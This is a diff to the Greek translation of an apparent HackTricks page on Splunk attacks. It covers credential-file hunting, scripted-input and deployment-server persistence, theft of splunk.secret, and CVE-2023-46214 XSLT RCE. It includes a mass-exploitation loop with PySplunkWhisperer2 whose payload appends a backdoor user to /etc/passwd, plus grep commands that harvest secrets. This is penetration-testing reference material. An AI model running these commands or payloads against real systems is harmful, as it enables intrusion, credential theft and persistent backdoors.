@@ -2,19 +2,19 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Αν κατά την **enumerating** ενός machine **internally** ή **externally** εντοπίσετε το **Splunk running** (συνήθως στη **8000** για το web UI και στη **8089** για το management API), τα valid credentials μπορούν συχνά να μετατραπούν σε **code execution** μέσω app installation, scripted inputs ή management actions. Αν το Splunk εκτελείται ως **root**, αυτό συχνά οδηγεί άμεσα σε **privilege escalation**.
+Αν κατά την **enumeration** ενός μηχανήματος **εσωτερικά** ή **εξωτερικά** εντοπίσετε το **Splunk σε λειτουργία** (συνήθως στη θύρα **8000** για το web UI και στη **8089** για το management API), έγκυρα διαπιστευτήρια μπορούν συχνά να μετατραπούν σε **code execution** μέσω εγκατάστασης app, scripted inputs ή ενεργειών διαχείρισης. Αν το Splunk εκτελείται ως **root**, αυτό συχνά οδηγεί άμεσα σε **privilege escalation**.
 
-Αν χρειάζεστε μόνο το generic remote attack surface, enumeration ή το app-upload RCE path, ελέγξτε:
+Αν χρειάζεστε μόνο το γενικό remote attack surface, enumeration ή τη διαδρομή app-upload RCE, ελέγξτε:
 
 {{#ref}}
 ../../network-services-pentesting/8089-splunkd.md
 {{#endref}}
 
-Αν είστε **already root** και το Splunk service δεν ακούει μόνο στο localhost, μπορείτε επίσης να κλέψετε **Splunk password hashes**, να ανακτήσετε **encrypted secrets** ή να προωθήσετε ένα **malicious app** για να διατηρήσετε persistence τοπικά ή σε πολλαπλούς forwarders.
+Αν είστε **ήδη root** και η υπηρεσία Splunk δεν ακούει μόνο στο localhost, μπορείτε επίσης να κλέψετε **Splunk password hashes**, να ανακτήσετε **encrypted secrets** ή να προωθήσετε ένα **malicious app** για να διατηρήσετε persistence τοπικά ή σε πολλαπλούς forwarders.
 
 ## Ενδιαφέροντα Local Files
 
-Όταν αποκτήσετε πρόσβαση σε host που εκτελεί Splunk ή Splunk Universal Forwarder, αυτές είναι συνήθως οι πιο ενδιαφέρουσες paths:
+Όταν αποκτήσετε πρόσβαση σε έναν host που εκτελεί Splunk ή Splunk Universal Forwarder, αυτές είναι συνήθως οι πιο ενδιαφέρουσες διαδρομές:
 ```bash
 export SPLUNK_HOME=/opt/splunk
 [ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder
@@ -28,24 +28,24 @@ grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLU
 - **`$SPLUNK_HOME/etc/passwd`**: local Splunk users και password hashes.
 - **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key που χρησιμοποιείται από το Splunk για την κρυπτογράφηση secrets που αποθηκεύονται σε διάφορα αρχεία `.conf`.
 - **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: αρχικό admin bootstrap file· χρήσιμο σε gold images και provisioning mistakes. Αγνοείται αν υπάρχει ήδη το `etc/passwd`.
-- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: όπου συνήθως ενεργοποιούνται scripted inputs.
-- **`$SPLUNK_HOME/etc/deployment-apps/`** ή **`$SPLUNK_HOME/etc/apps/`**: κατάλληλα σημεία για απόκρυψη ενός persistent app ή για έλεγχο του τι διανέμεται ήδη.
+- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: το σημείο όπου συνήθως ενεργοποιούνται τα scripted inputs.
+- **`$SPLUNK_HOME/etc/deployment-apps/`** ή **`$SPLUNK_HOME/etc/apps/`**: κατάλληλα σημεία για την απόκρυψη ενός persistent app ή για τον έλεγχο όσων διανέμονται ήδη.
 
-## Σύνοψη Exploit του Splunk Universal Forwarder Agent
+## Splunk Universal Forwarder Agent Exploit Summary
 
-Για περισσότερες λεπτομέρειες, δείτε [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Αυτή είναι απλώς μια σύνοψη:
+Για περισσότερες λεπτομέρειες, δείτε το [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Αυτό είναι απλώς μια σύνοψη:<sup>[[1]](#references)</sup>
 
-**Επισκόπηση exploit:**
-Ένα exploit που στοχεύει το Splunk Universal Forwarder (UF) επιτρέπει σε attackers με το **agent password** να εκτελούν arbitrary code σε συστήματα όπου εκτελείται ο agent, θέτοντας ενδεχομένως σε κίνδυνο μεγάλο μέρος του environment.
+**Exploit overview:**
+Ένα exploit που στοχεύει το Splunk Universal Forwarder (UF) επιτρέπει σε attackers με το **agent password** να εκτελούν arbitrary code σε συστήματα που εκτελούν τον agent, θέτοντας δυνητικά σε κίνδυνο μεγάλο μέρος του environment.
 
 **Γιατί λειτουργεί:**
 
-- Η management service του UF είναι συνήθως exposed στη **TCP 8089**.
+- Η management service του UF εκτίθεται συνήθως στο **TCP 8089**.
 - Οι attackers μπορούν να κάνουν authenticate στο API και να δώσουν εντολή στον forwarder να εγκαταστήσει ένα **malicious app bundle**.
 - Το ίδιο primitive μπορεί να χρησιμοποιηθεί τοπικά για **LPE** ή απομακρυσμένα για **RCE**.
-- Public tooling όπως το **SplunkWhisperer2** δημιουργεί αυτόματα το app bundle και μπορεί να προσαρμόσει τα payloads για Linux targets.
+- Public tooling, όπως το **SplunkWhisperer2**, δημιουργεί αυτόματα το app bundle και μπορεί να προσαρμόσει τα payloads για Linux targets.
 
-**Συνήθεις τρόποι ανάκτησης του password:**
+**Συνηθισμένοι τρόποι ανάκτησης του password:**
 
 - Cleartext credentials σε documentation, scripts, shares ή deployment automation.
 - Password hashes μέσα στο `$SPLUNK_HOME/etc/passwd`, ακολουθούμενα από offline cracking.
@@ -55,13 +55,13 @@ grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLU
 
 - SYSTEM/root-level code execution σε κάθε compromised host.
 - Deployment persistent apps, backdoors ή ransomware.
-- Απενεργοποίηση ή tampering του telemetry πριν προωθηθούν τα δεδομένα.
+- Απενεργοποίηση ή tampering με το telemetry πριν γίνει forward των δεδομένων.
 
 **Παράδειγμα command για exploitation:**
 ```bash
 for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
 ```
-**Χρήσιμα public exploits:**
+**Δημόσια exploits που μπορούν να χρησιμοποιηθούν:**
 
 - [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
 - [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
@@ -69,7 +69,7 @@ for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8
 
 ## Persistence μέσω Scripted Inputs ή Malicious Apps
 
-Αν έχετε **δικαιώματα εγγραφής στο filesystem** ως `root`/`splunk`, ή authenticated access για την εγκατάσταση apps, ένας πολύ αξιόπιστος μηχανισμός persistence είναι να τοποθετήσετε ένα **custom app** με ένα **scripted input**. Η τεκμηρίωση του Splunk αναμένει τα scripted inputs να βρίσκονται μέσα σε έναν κατάλογο app και να ενεργοποιούνται από το `inputs.conf`.
+Αν έχετε **πρόσβαση εγγραφής στο filesystem** ως `root`/`splunk`, ή authenticated access για την εγκατάσταση apps, ένας πολύ αξιόπιστος μηχανισμός persistence είναι να προσθέσετε ένα **custom app** με ένα **scripted input**.<sup>[[2]](#references)</sup> Η τεκμηρίωση του Splunk αναμένει τα scripted inputs να βρίσκονται κάτω από έναν κατάλογο app και να ενεργοποιούνται από το `inputs.conf`.
 
 Τυπική διάταξη:
 ```bash
@@ -95,17 +95,17 @@ chmod +x "$APP/bin/check.sh"
 ```
 Σημειώσεις:
 
-- Το ίδιο trick λειτουργεί και στο **Universal Forwarder**, χρησιμοποιώντας το `/opt/splunkforwarder/etc/apps/`.
-- Οι attackers συχνά αναμειγνύονται με το περιβάλλον τροποποιώντας ένα legitimate add-on αντί να δημιουργούν ένα προφανώς malicious app.
+- Το ίδιο trick λειτουργεί και στο **Universal Forwarder** με χρήση του `/opt/splunkforwarder/etc/apps/`.
+- Οι attackers συχνά προσπαθούν να περνούν απαρατήρητοι τροποποιώντας ένα legitimate add-on αντί να δημιουργούν ένα προφανώς malicious app.
 - Σε έναν **deployment server**, η τοποθέτηση ενός malicious app μέσα στο `deployment-apps/` μετατρέπεται σε **fleet-wide persistence**, επειδή οι forwarders κάνουν poll, κατεβάζουν updated apps και συχνά κάνουν restart για να τα εφαρμόσουν.
 
-## Credential Theft και Admin Takeover
+## Κλοπή Διαπιστευτηρίων και Takeover του Administrator
 
 Αν μπορείτε να διαβάσετε τα local files του Splunk, συνήθως υπάρχουν δύο καλοί στόχοι: η ανάκτηση **Splunk admin access** και η ανάκτηση **encrypted service credentials**.
 
 ### Password hashes και local users
 
-Το Splunk αποθηκεύει τα local authentication data στο `etc/passwd`. Ανάλογα με το deployment, το cracking αυτού του file μπορεί να ανακτήσει working credentials για το web UI και το management API.
+Το Splunk αποθηκεύει τα local authentication data στο `etc/passwd`. Ανάλογα με το deployment, το cracking αυτού του file μπορεί να ανακτήσει credentials που λειτουργούν για το web UI και το management API.
 
 Αν έχετε ήδη έγκυρα **admin** credentials και το Splunk χρησιμοποιεί το **native** authentication backend, το ίδιο το CLI μπορεί να χρησιμοποιηθεί για persistence:
 ```bash
@@ -114,10 +114,10 @@ chmod +x "$APP/bin/check.sh"
 ```
 ### `splunk.secret` και encrypted values
 
-Το Splunk χρησιμοποιεί το `etc/auth/splunk.secret` για την προστασία ευαίσθητων τιμών που αποθηκεύονται σε πολλά αρχεία ρυθμίσεων. Αν μπορέσετε να κλέψετε τόσο το **secret** όσο και τα σχετικά **`.conf` files**, συχνά μπορείτε να ανακτήσετε ή να επαναχρησιμοποιήσετε:
+Το Splunk χρησιμοποιεί το `etc/auth/splunk.secret` για την προστασία ευαίσθητων τιμών που αποθηκεύονται σε πολλά αρχεία configuration. Αν μπορέσετε να κλέψετε τόσο το **secret** όσο και τα σχετικά **`.conf` files**, συχνά μπορείτε να ανακτήσετε ή να επαναχρησιμοποιήσετε:
 
 - shared secrets των forwarder/indexer, όπως το `pass4SymmKey`
-- κωδικούς private keys TLS, όπως το `sslPassword`
+- κωδικούς πρόσβασης ιδιωτικών κλειδιών TLS, όπως το `sslPassword`
 - LDAP bind credentials, όπως το `bindDNPassword`
 
 Αυτό είναι χρήσιμο για **lateral movement**, ακόμη και όταν το Splunk admin password δεν μπορεί να γίνει crack.
@@ -129,33 +129,36 @@ chmod +x "$APP/bin/check.sh"
 - compromised installation templates
 - container images
 - unattended provisioning workflows
-- appliances όπου το Splunk επανεκκινείται αυτόματα από την αρχή
+- appliances όπου το Splunk αρχικοποιείται ξανά αυτόματα
 
-Σε αυτές τις περιπτώσεις, η τοποθέτηση ενός `HASHED_PASSWORD` που δημιουργήθηκε με το `splunk hash-passwd` σας προσφέρει έναν αθόρυβο τρόπο να ανακτήσετε admin access μετά το redeployment.
+Σε αυτές τις περιπτώσεις, η τοποθέτηση ενός `HASHED_PASSWORD` που δημιουργήθηκε με το `splunk hash-passwd` σας δίνει έναν αθόρυβο τρόπο να ανακτήσετε admin access μετά το redeployment.
 
-## Abusing Splunk Queries
+## Abuse του Splunk Queries
 
-Για περισσότερες λεπτομέρειες, δείτε [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).
+Για περισσότερες λεπτομέρειες δείτε το [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>
 
-Μια χρήσιμη πρόσφατη τεχνική είναι η κατάχρηση **user-supplied XSLT** σε ευάλωτες εκδόσεις του Splunk Enterprise, ώστε ένας authenticated account με χαμηλά δικαιώματα να μετατραπεί σε **OS command execution** ως ο χρήστης `splunk`.
+Μια χρήσιμη πρόσφατη technique είναι το abuse του **user-supplied XSLT** σε ευάλωτες εκδόσεις του Splunk Enterprise, ώστε ένας low-privileged authenticated account να μετατραπεί σε **OS command execution** ως ο χρήστης `splunk`.
 
 High-level flow:
 
 1. Κάντε authenticate στο Splunk.
-2. Κάντε upload ένα κακόβουλο **XSL** file μέσω της λειτουργικότητας preview/upload.
-3. Κάντε το Splunk να κάνει render τα search results με το uploaded stylesheet από τον κατάλογο **dispatch**.
-4. Χρησιμοποιήστε το XSLT payload για να γράψετε ένα file ή να ενεργοποιήσετε execution μέσω του Splunk search pipeline (για παράδειγμα, φτάνοντας σε internal functionality όπως το `runshellscript`).
+2. Κάντε upload ένα malicious **XSL** file μέσω της λειτουργικότητας preview/upload.
+3. Κάντε το Splunk να κάνει render τα search results με το uploaded stylesheet από τον φάκελο **dispatch**.
+4. Χρησιμοποιήστε το XSLT payload για να γράψετε ένα file ή να προκαλέσετε execution μέσω του Splunk's search pipeline, για παράδειγμα προσεγγίζοντας internal functionality όπως το `runshellscript`.
 
-Το σημαντικό offensive takeaway είναι ότι αυτό το path προσφέρει **post-auth RCE χωρίς να απαιτείται app upload**. Σε Linux συνήθως καταλήγετε στον λογαριασμό **`splunk`**, ο οποίος παραμένει πολύτιμος, επειδή αυτός ο χρήστης συχνά είναι owner του application tree, μπορεί να διαβάσει secrets και μπορεί να τοποθετήσει persistent apps που επιβιώνουν από την απώλεια του shell.
+Το σημαντικό offensive takeaway είναι ότι αυτό το path είναι **post-auth RCE χωρίς να απαιτείται app upload**. Σε Linux συνήθως σας δίνει πρόσβαση στον λογαριασμό **`splunk`**, ο οποίος παραμένει πολύτιμος επειδή αυτός ο χρήστης συχνά είναι owner του application tree, μπορεί να διαβάσει secrets και να τοποθετήσει persistent apps που επιβιώνουν από την απώλεια του shell.
 
-Ένα representative path που χρησιμοποιείται κατά το exploitation είναι:
+Ένα representative path που χρησιμοποιείται κατά την exploitation είναι:
 ```text
 /opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
 ```
-Αν το Splunk εκτελείται με υπερβολικά πολλά δικαιώματα ή αν ο χρήστης `splunk` έχει πρόσβαση σε επικίνδυνα scripts, εγγράψιμα service units ή κακούς κανόνες `sudo`, αυτό δημιουργεί μια καθαρή αλυσίδα **LPE**.
+Αν το Splunk εκτελείται με υπερβολικά πολλά προνόμια ή αν ο χρήστης `splunk` έχει πρόσβαση σε επικίνδυνα scripts, εγγράψιμες μονάδες υπηρεσιών ή κακούς κανόνες `sudo`, αυτό δημιουργεί μια καθαρή αλυσίδα **LPE**.
 
 ## Αναφορές
 
-- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
-- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
+- [1] [Κατάχρηση Splunk Forwarders για RCE και Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
+- [2] [Προσοχή στο TraitorWare: Χρήση του Splunk για Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
+- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
+- [4] [Ανάλυση του CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
+
 {{#include ../../banners/hacktricks-training.md}}
